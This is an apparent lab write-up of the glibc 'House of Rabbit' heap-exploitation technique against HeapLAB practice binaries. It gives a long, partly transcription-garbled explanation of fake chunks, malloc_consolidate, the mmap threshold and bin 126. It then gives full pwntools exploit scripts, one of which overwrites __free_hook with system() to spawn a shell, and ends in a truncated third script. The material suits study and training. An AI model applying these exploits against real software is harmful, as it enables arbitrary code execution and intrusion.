[{"content":"Overall Leverage a heap bug to link a fake chunk into a fastbin, the fake chunk consists of 2 size fields: one belongs to the fake chunk itself and the other belongs to the succeeding chunk’s size field. However, the succeeding chunk’s size field is placed 0x10 bytes before the fake chunk’s size field. The fake chunk wraps around the VA space with a size field of 0xfffffffffffffff1 and the succeeding chunk’s size is set to 0x11 (a so-called fencepost chunk). This is the smallest memory footprint a fake chunk can assume whilst satisfying fastbin next size checks and avoiding consolidation attempts. Once the fake chunk is linked into a fastbin it is consolidated into the unsortedbin via malloc_consolidate(). malloc_consolidate() cannot be triggered via malloc() because this results in the fake chunk being sorted which triggers an abort() call when it fails a size sanity check. Instead the fake chunk is sorted by freeing a chunk that exceeds the FASTBIN_CONSOLIDATION_THRESHOLD (0x10000 by default), this can be achieved by freeing a normal chunk that borders the top chunk because _int_free() considers the entire consolidated space to be the size of the freed chunk. Modify the fake chunk size so that it can be sorted into the largest largebin (bin[126]), malloc only searches this bin for very large requests. To qualify for this bin the fake chunk size must be 0x80001 or larger. Sort the fake chunk into bin[126] by requesting a larger chunk. If the arena’s system_mem variable is less than 0x80000, which it will be under default conditions when this heap has not been extended, it is required to artificially increase system_mem by requesting a large chunk, freeing it and requesting it again. Now that the fake chunk is linked into the largest largebin, it is safe to return its size to 0xfffffffffffffff1. Note that such a large size may not be appropriate when attempting to overwrite stack variables as the fake chunk size may be larger than av-\u0026gt;system_mem after the allocation. This will fail a size sanity check during subsequent allocation from the unsortedbin. This provides a House of Force-like primitive where a large request can be made from the fake chunk that spans the gap between the fake chunk and target memory. Approach Forge a House of Force-like primitive by linking a fake chunk into the largest largebin and setting its size field to a very large value. Further use An alternative to using a large fake chunk that wraps around the VA space during the initial link into a fastbin is to use a fake fast chunk with trailing fencepost chunks. This requires more controlled memory but bypasses the size sanity checks in malloc_consolidate() as of GLIBC 2.27. Limitations The size vs prev_size check introduced in GLIBC 2.26 means a designer must manually populate the prev_size field of the fake fencepost chunk. Note In the House of force, this was easy glimpse versions before 2.8 to 2.9 don\u0026rsquo;t have any top chunk size integrity checks. And as long as the larger request could not be serviced from any of an arenas Binz, the corrupt top chunk would be used. In my situation, however, I don\u0026rsquo;t want to allocate from the top chunk, I want to allocate froma fake chunk.\nOf course, I\u0026rsquo;re going to have to link my fake chunk into an arena, but which bin i link it into is also important.\nLarge requests will only be serviced from the unsorted bin or the appropriate large bin. So I can\u0026rsquo;t just fast bin dup my fake chunk into the fast bins in House of Lore. It\u0026rsquo;s into the small bins, then hope for the best. When a chunk is allocated or sorted from the unsorted bin, it\u0026rsquo;s subject to a size sanity check. This check means that I can\u0026rsquo;t simply allocate our fake junk from the unsorted bin because it needs to be much larger than the check will allow. However, allocations from the large bins are not subject to any size sanity checks. Also, recall that the largest large bid has no cap on the size of requests it can service. So if I can link our fake chunk into the largest large bin, I could safely make arbitrarily large allocations from it. Incidentally, the largest large bin is also known as bin 126 after its position in an arenas bins array, bin 127 is present but unused. -\u0026gt; The quickest route to linking our fake junk into bin at 126 like I do in the House of Lore. Unfortunately, my double free bug ability to control such a small amount of junk user data and the fact that I only control one codewords of our fake junk make using this technique difficult, if not impossible. Even if I could leverage the House of Lore to link our fake chunk into the unsorted bin, then sort it into bin 126 would corrupt the unsorted bin in the process, making progress from there very difficult.\nIt would be great if I could just double free a very large chunk, then tamper with its metadata in the same way I\u0026rsquo;ve done before in the fast bin dup technique.\nHowever, the normal chunk double for mitigation checks, the prev in use flag of the succeeding chunk, something that\u0026rsquo;s out of our reach -\u0026gt; this doesn\u0026rsquo;t work. Suitable target: fast bin.\nI only need to corrupt a single quad word to reliably link fake chunks into them, which can be done via a fast bin dup. And the only metadata our fake chunk would need is an appropriate size field. The question is having linked a fake chunk into the fast bins. How would I convince malloc to move it into the largest large bin?\nI can control the size of our fake junk via the age variable, so why don\u0026rsquo;t we just set it to a large value and make the request?\nThe problem with this approach is not only would the fake chunk fail the fast bins size integrity check, but malloc won\u0026rsquo;t even attempt to search the fast bins for such a large request. As I mentioned, I needed to move our fake chunk into the large bins for this to work. I learned in the House of Lore technique that chunks are sorted into the large bins via the unsorted bin. So first we\u0026rsquo;ll need to move our fake junk from the fast bins into the unsorted bin. The function named Mallock Consolidate, it\u0026rsquo;s responsible for flushing all the chunks in an arena\u0026rsquo;s vast bins into its unsorted bin, consolidating those chunks along the way if it can. The idea is that if a memory request can\u0026rsquo;t be serviced, it may be because vast chunks are causing a heap fragemetation. If mallock can consolidate any free fast chunks with their surrounding free space via the mallock consolidate function, it may result in a chunk large enough to service the request. Of course, this defeats the purpose of the fast bins, so it only occurs under certain memory pressure conditions. I can\u0026rsquo;t call mallock consolidate directly, it\u0026rsquo;s called from within some of malloc core functions, including from two locations within malloc and one location within free.\nFortunately for me, indirectly, triggering fast bin consolidation is relatively simple. Referencing the Heap Lab PDF, I can see the two locations within the malloc flow chart that malloc consolidate is called.\nThis one is easiest to reach. All I have to do is request a large chunk that 0x400 size and above. Once I\u0026rsquo;ve done that I were able to trigger malloc consolidate; however, it will fail. I can check which chunk was being unlinked, the next chunk variable. Malloc is trying to unlink a region of memory just after our fake chunk and malloc consolidate has determined the this doesn\u0026rsquo;t exist. I know how mallock determines a forward consolidation candidate, malloc looks at the size value of our fake chunk and scrolls forward in memory by that amount to find the next chunk.\nIt then looks at the size value of that chunk scrolls forward again by that amount and it checks the prev in use flag of this third chunk if the third chunks prev in use flag is clear. That means the chunk after our fake chunk must be a consolidation candidate and malloc will consolidate the fake chunk forward with it.\nThe size field it encounters at that address is zero. Malloc doesn\u0026rsquo;t check for size field integrity during this process, so it scrolls forward again by zero bytes.\nMarlock checks the prev in U.S. flag at about a location which is clear, indicating that the chunk after our fake chunk is a consolidation candidate.\nThe segmentation fault occurs when malloc tries to dereference NUL quad word, it believes to be forward and backward pointis belonging to this non-existent chunk.\nI\u0026rsquo;m already preventing backward to consolidation since our fake chunks size field has a set prev in use bit, but that\u0026rsquo;s where our influence ends. If I had more control over memory in this region, I could provide fenceposts chunks, but I only control a single quad word and I need that for a size field.\nLet\u0026rsquo;s think about this, is there a chunk a size value that can, on its own prevent both backward and forward consolidation? The original House of Rabbit technique required control over two quad word to overcome our consolidation. The fake chunk size would be set to the largest possible value. that\u0026rsquo;s 0xfffffffffffffff1, then a fencepost chunk was placed just before it. This had the effect of making the fake junk its own forward consolidation guard. malloc would look at its size field, scroll forward that amount to find the next chunk, wrapping around the VA space as it did so and coming to a stop at the fencepost chunk just before the fake chunk. Fencepost chunks are illegally-sized 0x10 chunks, and we briefly saw their use by malloc in the House of Orange technique in Part 1. While this approach could work if we controlled 2 nearby quadwords, sadly we only control 1.\nThe solution we\u0026rsquo;re going to use also involves making our fake chunk its own forward consolidation guard, just using a different size value. That value is 1.\nAlthough this time due to an abort rather than a segfault. Our fake chunk was able to avoid backward consolidation because it has a set prev_inuse flag and this time it also avoided forward consolidation. Malloc checked its size which is zero, flags don\u0026rsquo;t count towards chunk size, so it scrolled forward in memory to the next chunk by zero bytes -\u0026gt; Our fake chunk is now its own nextchunk -\u0026gt; Malloc checks the size of the next chunk, still zero bytes and scrolls forward again by that amount -\u0026gt; Our fake chunk is now its own next next chunk. Since this chunk has a set prev_inuse bit, that means from malloc\u0026rsquo;s point of view, the chunk after our fake chunk isn\u0026rsquo;t free and therefore not a consolidation candidate. The result is that our fake chunk gets legitimately linked into the unsortedbin, avoiding any nasty segfaults. It fails, this is the unsortedbin size sanity check, we\u0026rsquo;ve come across it before, albeit briefly, it\u0026rsquo;s there to ensure that unsorted chunks being allocated or sorted have a sensible size value.\nSensible is defined here as no smaller than a fencepost chunk and no larger than the arena\u0026rsquo;s system_mem value. system_mem value is a record of the total amount of memory this arena has checked out from the kernel. Our fake chunk is subject to this check because it\u0026rsquo;s being sorted as a side effect of the large request we made to trigger malloc_consolidate() in the first place. We requested a 0x400-sized chunk and a quick look at the malloc flow chart in the PDF indicates that right after malloc_consolidate() is called malloc will search the unsortedbin, coming across our fake chunk, which fails the size sanity check. This is a problem, we need to call malloc_consolidate() to move our fake chunk into the unsortedbin and to avoid segfaulting along the way, our fake chunk needs to be an invalid size. Fortunately, there are a couple of solutions to this dilemma.\nOne option is to preemptively free a large chunk into the unsortedbin before our fake chunk gets there. This way, our large request will still trigger malloc_consolidate(), but the large chunk in the unsorted bin will be allocated before the search makes it to our fake chunk. The second option is more efficient however, and it\u0026rsquo;s what we\u0026rsquo;ll use in our exploit. Take a look at the free flowchart in the HeapLAB PDF and note the fastbin consolidation event there.\nWhen freeing a normal chunk, malloc_consolidate() may be called if the chunk size surpasses something called the fastbin consolidation threshold. If we can trigger malloc_consolidated() this way, via free() rather than malloc(), an unsortedbin search won\u0026rsquo;t occur afterwards and our fake chunk will stay safely in the unsortedbin. All we need to do is free a chunk larger than the fastbin consolidation threshold.\nThe fastbin consolidation threshold is a constant, different distros make compile their GLIBC binaries with different values, but by default it\u0026rsquo;s set at 65536, or 0x10000. Allocating and freeing a chunk of this size won\u0026rsquo;t be an issue in the house_of_rabbit binary, but there\u0026rsquo;s an even more efficient way to do this. Notice how the size of the freed chunk is used to determine whether malloc_consolidate() is called after consolidation. This means that freeing a small chunk that is subsequently consolidated with a larger chunk can trigger the behavior I want. Even better, this holds true for consolidation with the top chunk. I\u0026rsquo;m going to replace our large chunk with a much smaller one. Then I\u0026rsquo;re going to free it. The request will no longer trigger malloc_consolidate(), instead this chunk will be consolidated with the top chunk in the usual way and its total size afterwards will be compared against the fastbin consolidation threshold. Since our top chunk is much larger than the threshold, malloc_consolidate() will be triggered, but without the subsequent unsortedbin search, leaving our fake chunk in the unsortedbin. Afterwards, I need to do is change our fake chunk size using the amend_age option in the program\u0026rsquo;s menu to 0x80000 or larger, the minimum size that qualifies for bin 126. Then, I\u0026rsquo;ll make a request for an even larger chunk, which should result in our fake chunk being sorted into the largest largebin. Requesting a smaller chunk would have the same effect, but would then remainder our fake chunk, dumping the remainder back into the unsortedbin.\nI could prevent this by stashing a smaller chunk in the unsortedbin that would get allocated after our fake chunk was sorted, but calls to malloc() are at a premium here, so I\u0026rsquo;ll stick with the more efficient course of action. Remember I can\u0026rsquo;t set the fake chunk\u0026rsquo;s size to the maximum yet, it still needs to pass the unsortedbin size sanity check as it\u0026rsquo;s sorted into the largebins. After that add a call to the malloc function requesting a chunk slightly larger than our latest fake chunk\u0026rsquo;s size. Unfortunately, the program fails again, the reason for this is that the unsortedbin size sanity check has stopped. If it isn\u0026rsquo;t obvious, our fake chunk is still a much larger than the total memory the main arena has checked out from the kernel. From malloc\u0026rsquo;s perspective, that shouldn\u0026rsquo;t happen, hence the abort.\nThe problem is our fake chunk can\u0026rsquo;t be any smaller at this point, otherwise it won\u0026rsquo;t get sorted into bin 126. So if I can\u0026rsquo;t modify one side of the equation, can I modify the other?\nIf system_mem represents the total memory an arena has checked out, couldn\u0026rsquo;t I just request more memory, increasing that value until it reaches the total I want?\nI\u0026rsquo;re going to request a large chunk that should bring the total memory checked out by the main arena to the size of our fake chunk, 0x80000 or higher. The default heap start size on this distro is 0x21000. So if I keep to round numbers, a chunk size of 0x60000 should increase system_mem to 0x81000.\nI\u0026rsquo;ll make this allocation at the start of the script so it doesn\u0026rsquo;t interfere with our work so far. I\u0026rsquo;re still tripping over the same exploit mitigation, what\u0026rsquo;s going on here?\nLet\u0026rsquo;s inspect the main arena\u0026rsquo;s system_mem value to check if our idea worked. It hasn\u0026rsquo;t changed. Furthermore, issuing the \u0026lsquo;heap\u0026rsquo; command should show our 0x60000-sized chunk, but it doesn\u0026rsquo;t.\nIt\u0026rsquo;s due to something called the mmap threshold.\nWhen malloc receives a particularly large request, it assumes it\u0026rsquo;s a one-off event, that the program won\u0026rsquo;t be frequently allocating and freeing chunks of this size. So to avoid a situation whereby this very large chunk gets trapped between smaller chunks, unable to be reclaimed by the system, malloc uses the mmap() syscall to request it directly without impacting any heaps. The very large chunk then exists on its own, outside of any heap region, and can be immediately reclaimed by the system via munmap() when the program is done with it. As an aside, if you noticed that this large chunk doesn\u0026rsquo;t start at the beginning of it\u0026rsquo;s containing mapping, for example by using pwndbg\u0026rsquo;s \u0026lsquo;xinfo\u0026rsquo; command, don\u0026rsquo;t worry, the kernel has final say in the virtual address of mmapped regions and in this case has just appended the large chunk to an existing mapping made by the dynamic loader during process initialization.\nIf you\u0026rsquo;re curious as to why the chunk is a page too large, 0x61000 instead of 0x60000, it\u0026rsquo;s because mmap size granularity is at the page level. A 0x60000-sized chunk requires one quadword more than 0x60000 bytes to accommodate its unused prev_size field, which leads to that extra page getting mapped. So my 0x60000 chunk ended up here because its size passed a threshold where malloc considers it more efficient to allocate it with mmap() instead of on a heap. The \u0026ldquo;mmap_threshold\u0026rdquo; variable resides in a struct labeled \u0026ldquo;mp_\u0026rdquo; of type \u0026ldquo;malloc_par\u0026rdquo;, short for \u0026ldquo;malloc parameters\u0026rdquo;.\nI might recognize the \u0026ldquo;sbrk_base\u0026rdquo; field of this struct, which we\u0026rsquo;ve used a few times as a quick means of finding the start of the default heap. The \u0026ldquo;mmap_threshold\u0026rdquo; variable holds its default and minimum value for this distro, 0x20000, as defined as 128 times 1024. Distro maintainers might tweak this and it can be directly manipulated via a function called mallopt(), which is unfortunately unavailable to me in this scenario. Our problem is that as long as the mmap threshold remains at this value, we can\u0026rsquo;t allocate large chunks on the default heap to increase its system_mem value.\nI could of course allocate a series of smaller chunks, but this binary has a cap on total allocations so we need to do this more efficiently.\nIt used to be the case that the mmap threshold was a fixed value, but nowadays it adapts to the size of chunks a program is using.\nFor example, if a program is making heavy use of chunks beyond the mmap threshold, allocating them all with mmap() rather than heap space is going to be much slower. And since these chunks are most likely being freed often, the risk of them tying up memory is lessened. In this case, malloc can adjust the mmap threshold to maintain efficiency. \u0026ldquo;if (chunk is mmapped())\u0026rdquo; is simply checking for the IS_MMAPPED flag, and these are the important lines of the next IF statement. If the size of the chunk being freed is beyond the current mmap threshold, increase the mmap threshold to that chunk\u0026rsquo;s size value. -\u0026gt; We can take advantage of this by freeing our 0x60000-sized chunk to increase the mmap threshold, then requesting it again, at which point malloc should allocate it on the default heap rather than via mmap(). At the start of our script, I\u0026rsquo;ll make a second request for a 0x60000-sized chunk, and between them I\u0026rsquo;ll free the first one. The first 0x60000 request will surpass the mmap threshold and gets allocated via mmap(), as I\u0026rsquo;ve just witnessed.\nFreeing this chunk will simply unmap it, but in doing so malloc will adjust the mmap threshold to accommodate chunks of this size in the future. The second 0x60000 request is now below the mmap threshold and will be allocated from the heap like everything else.\nTo service this request, malloc will have to extend the top chunk by requesting more memory from the kernel. This, in turn, will increase the main arena\u0026rsquo;s system_mem value, which has been our goal all along. To summarize, I used a double-free bug in this binary to link a fake chunk into the fastbins, I can use other bug types to achieve the same thing, but a double-free was all I had to work with here.\nI then triggered the malloc_consolidate() function to move our fake chunk from the fastbins into the unsortedbin. I did this by freeing a normal chunk that bordered the top chunk, although if I wanted to be more efficient, I could have just freed the second 0x60000 chunk.\nTo ensure malloc_consolidate() didn\u0026rsquo;t attempt to consolidate our fake chunk with its surrounding space, I set its prev_inuse flag, preventing backward consolidation and set its size to zero. This meant that our fake chunk became its own next chunk and its own next next chunk, preventing forward consolidation.\nOnce our fake chunk was safely linked into the unsortedbin, I changed its size to 0x80000 the smallest size eligible for the largest largebin or bin 126.\nBefore sorting it into that bin, I had to ensure it would pass the unsortedbin size sanity check.\nAlong the way, this meant increasing the arena\u0026rsquo;s system_mem value to the size of our fake chunk or higher. I did this by allocating a 0x60000-sized chunk on the heap, which brought the system_mem total from 0x21000 to 0x81000. This, in turn, was possible because I had also increased the mmap threshold by requesting, then freeing a 0x60000-sized chunk beforehand, allowing the second 0x60000 chunk to be allocated on the heap rather than via mmap(). Now that our fake chunk was linked into the largest largebin, which has no size limit, I changed its size to the largest possible value.\nFinally, thanks to the lack of largebin sanity checks, I made an allocation from our fake chunk that bridged the gap between itself and our target data. The next request I made was serviced from our fake chunk\u0026rsquo;s remainder, which neatly overlapped the target, allowing us to overwrite it.\nI\u0026rsquo;re going to target the malloc hooks with our arbitrary write, specifically the free hook, since I can free chunks that contain attacker-controlled data.\nTo do this, I\u0026rsquo;ll need to replace the \u0026ldquo;distance\u0026rdquo; variable with the distance between our fake chunk and a spot just before the free hook. This should leave the remainder of our fake chunk overlapping the free hook after the subsequent allocation.\nWhen I allocate that remainder, I\u0026rsquo;ll need to write 1 quadword of garbage to fill the gap between the start of chunk user data and the free hook because the free hook isn\u0026rsquo;t 16-byte-aligned.\nHowever, I\u0026rsquo;re failing the unsortedbin size sanity check again.\nNow, the reason for this can be a little hard to track down. The chunk that\u0026rsquo;s failing the size sanity check is the remainder of our fake chunk, which now sits just before the free hook. The size of this chunk is far in excess of even the artificially inflated system_mem value that I\u0026rsquo;re dealing with. The reason this mitigation wasn\u0026rsquo;t triggered in my previous exploit is that I allocated so much of the original fake chunk\u0026rsquo;s space to bridge the gap between it and the target data that the remainder\u0026rsquo;s size fell back into a valid range. In this case, I\u0026rsquo;re only requesting a tiny portion of the huge fake chunk to bridge a much smaller gap, one that doesn\u0026rsquo;t wrap around the VA space. This leaves the remainder much larger than its arena\u0026rsquo;s system_mem value. The solution to this problem is simple; I control the size of the fake chunk, so instead of setting it to the largest possible value, let\u0026rsquo;s just keep it much smaller.\nScript target.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./house_of_rabbit\u0026#39;, checksec=False) #libc = ELF(\u0026#39;\u0026#39;, checksec=False) libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+359 b *main+593 b *main+660 b *main+755 b *main+793 \u0026#34;\u0026#34;\u0026#34; def info(mess): return log.info(mess) def success(mess): return log.success(mess) def error(mess): log.error(mess) def start(): if args.GDB: return gdb.debug(elf.path, env={\u0026#34;LD_PRELOAD\u0026#34;: libc.path},gdbscript=gs) elif args.REMOTE: return remote(\u0026#39;\u0026#39;, ) else: return process(elf.path, env={\u0026#34;LD_LIBRARY_PATH\u0026#34;: libc.path}) index = 0 # Select the \u0026#34;malloc\u0026#34; option; send size \u0026amp; data. # Returns chunk index. def malloc(size, data): global index io.send(b\u0026#34;1\u0026#34;) io.sendafter(b\u0026#34;size: \u0026#34;, f\u0026#34;{size}\u0026#34;.encode()) io.sendafter(b\u0026#34;data: \u0026#34;, data) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) index += 1 return index - 1 # Select the \u0026#34;free\u0026#34; option; send index. def free(index): io.send(b\u0026#34;2\u0026#34;) io.sendafter(b\u0026#34;index: \u0026#34;, f\u0026#34;{index}\u0026#34;.encode()) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) # Select the \u0026#34;amend age\u0026#34; option; send new value. def amend_age(age): io.send(b\u0026#34;3\u0026#34;) io.sendafter(b\u0026#34;age: \u0026#34;, f\u0026#34;{age}\u0026#34;.encode()) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) # Calculate the \u0026#34;wraparound\u0026#34; distance between two addresses. def delta(x, y): return (0xffffffffffffffff - x) + y io = start() # This binary leaks the address of puts(), use it to resolve the libc load address. io.recvuntil(b\u0026#34;puts() @ \u0026#34;) libc.address = int(io.recvline(), 16) - libc.sym.puts io.timeout = 0.1 # ============================================================================= # =-=-=- PREPARE A FAKE CHUNK -=-=-= # Craft a fake chunk using the \u0026#34;age\u0026#34; field. # Set its prev_inuse flag to avoid backward consolidation. # This fake chunk has a size of 0, so it acts as its own forward consolidation guard. age = 1; io.sendafter(b\u0026#34;age: \u0026#34;, f\u0026#34;{age}\u0026#34;.encode()) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) # =-=-=- INCREASE MMAP THRESHOLD -=-=-= # Before we can increase the main arena\u0026#39;s system_mem value, we must increase the mmap_threshold. # We do this by requesting then freeing a chunk with size beyond the mmap threshold. mem = malloc(0x5fff8, b\u0026#34;Y\u0026#34;*8) # Allocated via mmap(). free(mem) # Freeing an mmapped chunk increases the mmap threshold to its size. # =-=-=- INCREASE SYSTEM_MEM -=-=-= # Now that the mmap threshold is beyond 0x60000, requesting chunks of that size will allocate them # from a heap, rather than via mmap(). # This in turn will increase the total memory checked out from the kernel, which is tracked by # an arena\u0026#39;s system_mem field. mem = malloc(0x5fff8, b\u0026#34;Z\u0026#34;*8) # =-=-=- LINK FAKE CHUNK INTO A FASTBIN -=-=-= # Leverage a fastbin dup to link the fake \u0026#34;age\u0026#34; chunk into the 0x20 fastbin. dup = malloc(0x18, b\u0026#34;A\u0026#34;*8) safety = malloc(0x18, b\u0026#34;B\u0026#34;*8) free(dup) free(safety) free(dup) malloc(0x18, pack(elf.sym.user)) # Address of fake chunk. # =-=-=- CONSOLIDATE FAKE CHUNK INTO UNSORTEDBIN -=-=-= # Trigger malloc_consolidate() to move the fake chunk from the fastbins into the unsortedbin. # Use a consolidation with the top chunk to achieve this. consolidate = malloc(0x88, b\u0026#34;C\u0026#34;*8) free(consolidate) # =-=-=- SORT FAKE CHUNK INTO BIN 126 -=-=-= # Sort the fake chunk into bin 126 by setting its size to the minimum required to qualify for it, # then requesting a chunk larger than the fake chunk. # This part is where the unsortedbin size sanity check would catch us if we hadn\u0026#39;t increased system_mem. amend_age(0x80001) malloc(0x80008, b\u0026#34;D\u0026#34;*8) # Increase the fake chunk size so that it can wrap around the VA space to reach the target data. amend_age(0xfffffffffffffff1) # =-=-=- OVERWRITE TARGET DATA -=-=-= # Request a large chunk to bridge the gap between the fake chunk and the target. distance = delta(elf.sym.user, elf.sym.target - 0x20) malloc(distance, b\u0026#34;E\u0026#34;*8) # The next request is serviced by the fake chunk\u0026#39;s remainder and the first qword of user data overlaps the target data. malloc(24, b\u0026#34;Much win\\0\u0026#34;) # Check that the target data was overwritten. io.sendthen(b\u0026#34;target: \u0026#34;, b\u0026#34;4\u0026#34;) target_data = io.recvuntil(b\u0026#34;\\n\u0026#34;, True) assert target_data == b\u0026#34;Much win\u0026#34; io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) # ============================================================================= io.interactive() shell.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./house_of_rabbit\u0026#39;, checksec=False) #libc = ELF(\u0026#39;\u0026#39;, checksec=False) libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+359 b *main+593 b *main+660 b *main+755 b *main+793 \u0026#34;\u0026#34;\u0026#34; def info(mess): return log.info(mess) def success(mess): return log.success(mess) def error(mess): log.error(mess) def start(): if args.GDB: return gdb.debug(elf.path, env={\u0026#34;LD_PRELOAD\u0026#34;: libc.path},gdbscript=gs) elif args.REMOTE: return remote(\u0026#39;\u0026#39;, ) else: return process(elf.path, env={\u0026#34;LD_LIBRARY_PATH\u0026#34;: libc.path}) index = 0 # Select the \u0026#34;malloc\u0026#34; option; send size \u0026amp; data. # Returns chunk index. def malloc(size, data): global index io.send(b\u0026#34;1\u0026#34;) io.sendafter(b\u0026#34;size: \u0026#34;, f\u0026#34;{size}\u0026#34;.encode()) io.sendafter(b\u0026#34;data: \u0026#34;, data) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) index += 1 return index - 1 # Select the \u0026#34;free\u0026#34; option; send index. def free(index): io.send(b\u0026#34;2\u0026#34;) io.sendafter(b\u0026#34;index: \u0026#34;, f\u0026#34;{index}\u0026#34;.encode()) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) # Select the \u0026#34;amend age\u0026#34; option; send new value. def amend_age(age): io.send(b\u0026#34;3\u0026#34;) io.sendafter(b\u0026#34;age: \u0026#34;, f\u0026#34;{age}\u0026#34;.encode()) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) # Calculate the \u0026#34;wraparound\u0026#34; distance between two addresses. def delta(x, y): return (0xffffffffffffffff - x) + y io = start() # This binary leaks the address of puts(), use it to resolve the libc load address. io.recvuntil(b\u0026#34;puts() @ \u0026#34;) libc.address = int(io.recvline(), 16) - libc.sym.puts io.timeout = 0.1 # ============================================================================= # =-=-=- PREPARE A FAKE CHUNK -=-=-= # Craft a fake chunk using the \u0026#34;age\u0026#34; field. # Set its prev_inuse flag to avoid backward consolidation. # This fake chunk has a size of 0, so it acts as its own forward consolidation guard. age = 1; io.sendafter(b\u0026#34;age: \u0026#34;, f\u0026#34;{age}\u0026#34;.encode()) io.recvuntil(b\u0026#34;\u0026gt; \u0026#34;) # =-=-=- INCREASE MMAP THRESHOLD -=-=-= # Before we can increase the main arena\u0026#39;s system_mem value, we must increase the mmap_threshold. # We do this by requesting then freeing a chunk with size beyond the mmap threshold. mem = malloc(0x5fff8, b\u0026#34;Y\u0026#34;*8) # Allocated via mmap(). free(mem) # Freeing an mmapped chunk increases the mmap threshold to its size. # =-=-=- INCREASE SYSTEM_MEM -=-=-= # Now that the mmap threshold is beyond 0x60000, requesting chunks of that size will allocate them # from a heap, rather than via mmap(). # This in turn will increase the total memory checked out from the kernel, which is tracked by # an arena\u0026#39;s system_mem field. mem = malloc(0x5fff8, b\u0026#34;Z\u0026#34;*8) # =-=-=- LINK FAKE CHUNK INTO A FASTBIN -=-=-= # Leverage a fastbin dup to link the fake \u0026#34;age\u0026#34; chunk into the 0x20 fastbin. dup = malloc(0x18, b\u0026#34;A\u0026#34;*8) safety = malloc(0x18, b\u0026#34;B\u0026#34;*8) free(dup) free(safety) free(dup) malloc(0x18, pack(elf.sym.user)) # Address of fake chunk. # =-=-=- CONSOLIDATE FAKE CHUNK INTO UNSORTEDBIN -=-=-= # Trigger malloc_consolidate() to move the fake chunk from the fastbins into the unsortedbin. # Use a consolidation with the top chunk to achieve this. consolidate = malloc(0x88, b\u0026#34;C\u0026#34;*8) free(consolidate) # =-=-=- SORT FAKE CHUNK INTO BIN 126 -=-=-= # Sort the fake chunk into bin 126 by setting its size to the minimum required to qualify for it, # then requesting a chunk larger than the fake chunk. # This part is where the unsortedbin size sanity check would catch us if we hadn\u0026#39;t increased system_mem. amend_age(0x80001) malloc(0x80008, b\u0026#34;D\u0026#34;*8) # Increase the fake chunk size so that it can reach the free hook. # Making this value too large will fail the size sanity check during unsortedbin allocation # of the following chunk. It can also trigger segfaults or busfaults when the remaindering code # attempts to update the prev_size field of the succeeding chunk. distance = (libc.sym.__free_hook - 0x20) - elf.sym.user amend_age(distance + 0x29) # =-=-=- OVERWRITE FREE HOOK -=-=-= # The next request is serviced by the fake chunk. # Request a large chunk to bridge the gap between the fake chunk and the free hook. # Write the string \u0026#34;/bin/sh\u0026#34; into this chunk for use later as the argument to system(). binsh = malloc(distance, b\u0026#34;/bin/sh\\0\u0026#34;) # The next request is serviced by the fake chunk again and overlaps the free hook. # Use it to overwrite the free hook with the address of system(). malloc(0x18, pack(0) + pack(libc.sym.system)) # Free the chunk with \u0026#34;/bin/sh\u0026#34; in the 1st qword of its user data. # This triggers a call to system(\u0026#34;/bin/sh\u0026#34;). free(binsh) # ============================================================================= io.interactive() Heap Feng Shui shell.py 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 143 144 145 146 147 148 149 150 151 152 153 154 155 156 157 158 159 160 161 162 163 164 165 166 167 168 169 170 171 172 173 174 175 176 177 178 179 180 181 182 183 184 185 186 #!/usr/bin/env python3 from pwn import * context.log_level = \u0026#39;debug\u0026#39; context.binary = elf = ELF(\u0026#39;./house_of_rabbit_nofast\u0026#39;, checksec=False) #libc = ELF(\u0026#39;\u0026#39;, checksec=False) libc = elf.libc gs = \u0026#34;\u0026#34;\u0026#34; b *main b *main+187 b *main+298 b *main+396 b *main+463 b *main+575 \u0026#34;\u0026#34;\u0026#34; def info(mess): return log.info(mess) def success(mess): return log.success(mess) def error(mess): log.error(mess) def start(): if args.GDB: return gdb.debug(elf.path, env={\u0026#34;LD_PRELOAD\u0026#34;: libc.path},gdbscript=gs) elif args.REMOTE: return remote(\u0026#39;\u0026#39;, ) else: return process(elf.path, 